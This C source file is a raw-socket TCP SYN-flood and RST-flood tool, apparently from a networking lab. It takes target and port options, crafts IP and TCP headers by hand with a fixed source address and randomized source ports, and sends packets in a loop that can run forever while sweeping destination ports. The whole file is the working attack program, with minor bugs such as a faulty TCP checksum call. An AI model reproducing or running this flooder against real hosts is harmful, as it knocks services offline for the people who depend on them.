#include <stdio.h>
#include <getopt.h>
#include <netinet/tcp.h>
#include <time.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <errno.h>

#include "funcs.c"

#define IP_MAXPACKET 65535

int change = 0;
char src_ip[16]="10.0.2.15";
int port;
unsigned long int pkt_count = 0;


int main(int argc, char* argv[])
{

  char* target;
  char* data;
  char* port_str;
  int port;
  int choice;
  int synFlag = 0;
  int rstFlag = 0;
  int got_target = 0;
  int got_port = 0;
  int got_rst = 0;
  int option_found = 0;

//getting ops

  while ((choice = getopt(argc, argv, "p:t:r")) != -1)
  {
    switch (choice)
    {
        case 't' :
        got_target = 1;
        target = optarg;
        option_found++;
        break;
      case 'p' :
        got_port = 1;
        port_str = optarg;
        option_found++;
        break;
      case 'r' :
        got_rst = 1;
        break;
      default :
      if (optopt == 'p')
        fprintf (stderr, "Option -%c requires an argument.\n", optopt);
      break;
      if (optopt == 't')
        fprintf (stderr, "Option -%c requires an argument.\n", optopt);
      break;
    }
  }

  //default ops

  if(!got_target)
    target = "127.0.0.1";
  if(!got_port)
    port_str = "80";
  if(got_rst)
    rstFlag = 1;
  else
    synFlag = 1;

  //convert to int

  port = strtoint(port_str);

//if rst flag is set

  char* rst = got_rst ? "RST" : "Syn-Flood";
  printf("Port = %s\nTarget = %s\nMode: %s\n", port_str, target, rst);


  ///////////////////////////////////////////////////////////////////////

  // A datagram (the packet) max IP_MAXPACKET
  char datagram[IP_MAXPACKET];

  //IP header
  struct iphdr *iph = (struct iphdr *) datagram;

  //TCP header
  struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
  struct sockaddr_in sin;

  //ipv4
  sin.sin_family = AF_INET;
  //host to network big indiean to little indiean
  //set port
  sin.sin_port = htons(port);
  //target ip
  //set ip
  sin.sin_addr.s_addr = inet_addr (target);

  memset (datagram, 0, IP_MAXPACKET); // Clear the buffer to zeros

  // Fill the IP Header
  iph->ihl = 5;   //Header length
  iph->version = 4; //Version
  iph->tos = 0; //Type of service
  iph->tot_len = sizeof (struct ip) + sizeof (struct tcphdr); //Total length
  iph->id = htons(1);  //Packet ID??why this
  iph->frag_off = 0; //Fragmentation offset - set to zero
  iph->ttl = 255; //Time to live
  iph->protocol = IPPROTO_TCP;  //Protocol
  iph->check = 0;      //Setting to zero before calculating the checksum
  iph->saddr = inet_addr ( src_ip );    //the source IP
  iph->daddr = sin.sin_addr.s_addr;

  iph->check = calculate_checksum ((unsigned short *) datagram, iph->tot_len >> 1);// IP Checksum

  //TCP Header
  tcph->source = htons (port); //Source port ??again
  // tcph->dest = htons (80);
  tcph->dest = htons (port); //Destination port
  tcph->seq = 0;  //Sequence number
  tcph->ack_seq = 0; //Acknowledgement number
  tcph->doff = 5;      // Data offset
  //Flags
  tcph->fin=0;
  tcph->syn=synFlag;//acording to what we set
  tcph->rst=rstFlag;//acording to what we set
  tcph->psh=0;
  tcph->ack=0;
  tcph->urg=0;
  tcph->window = htons (5840); // Maximum window size
  tcph->check = 0;
  tcph->urg_ptr = 0;

  // Creating a raw socket
  //system call binds raw sock for us
  int sock = -1;
      if ((sock = socket (AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
      {
          fprintf (stderr, "socket() failed with error: %d\n",errno);
          fprintf (stderr, "To create a raw socket, the process needs to be run by Admin/root user.\n\n");
          return -1;
      }

  /*The following line tells the kernel that the IP header is included
  so it will fill the data link layer information for us (source and next hop mac addresses)*/
  //the networking in kernel is in charge only for Ethernet header
  const int flagOne = 1;
  if (setsockopt (sock, IPPROTO_IP, IP_HDRINCL, &flagOne, sizeof (flagOne)) == -1)
   {
       fprintf (stderr, "setsockopt() failed with error: %d\n", errno);
       return -1;
   }
int rounds=0;
printf("enter num of Packet if you want infinit loop enter -1\n");
scanf("%d",&rounds);
printf("got %d\n",rounds);

int portemp=1;

  while (rounds>0 || rounds==-1)  //Looping
  {

        //ramdomizing port
    // /////////////tempppppppp//////
     tcph->dest = htons (portemp); //Destination port
     portemp = (portemp + 1)%65500;

    ///////////////////////////

    tcph->check = 0;
    iph->check = 0;
    tcph->source = htons (randomPort()); //Randomize source port
    iph->saddr = inet_addr ( src_ip );//Update the IP header

/////checksum

    iph->check = calculate_checksum ((unsigned short *) datagram, iph->tot_len >> 1);

    data = datagram + sizeof(struct iphdr) + sizeof(struct tcphdr);

    int psize = sizeof(struct tcphdr) + strlen(data);

    tcph->check = calculate_checksum( (unsigned short*) &iph , psize);

////end checksum///

    // Sending the packet
    if (sendto (sock,              /* our socket */
                datagram,         /* the buffer containing headers and data */
                iph->tot_len,    /* total length of our datagram */
                0,              /* routing flags, normally always 0 */
                (struct sockaddr *) &sin,   /* socket addr, just like in */
                sizeof (sin)) < 0)       /* a normal send() */
    {
      fprintf (stderr, "sendto() failed with error: %d", errno);
        return -1;
    }

    //Data send successfully

    else
    {
        printf ("Packet Sent from %s to the target\n", src_ip);
        printf("The TCP checksum = %x\n", tcph->check);
        printf("The IP checksum = %x\n", iph->check);
        printf("packet number %zu ",pkt_count);
        pkt_count++;
    }
    if(rounds!=-1)
    rounds--;
  }
    ///////////////////////////////////////////////////////////////////////
   close(sock);
   printf("\n%zu packets sent\n", pkt_count);
   return 0;
}
